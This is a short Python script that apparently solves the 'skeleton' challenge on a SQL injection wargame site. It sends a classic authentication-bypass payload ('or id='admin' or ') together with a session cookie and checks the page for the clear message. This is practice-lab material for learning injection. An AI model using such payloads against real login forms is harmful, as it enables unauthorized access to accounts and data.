import requests

url = 'https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php'
cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
payload = "?pw='or id='admin' or '"

r = requests.get(url + payload, cookies=cookie)
if 'SKELETON Clear!' in r.text:
    print('SKELETON Clear!')
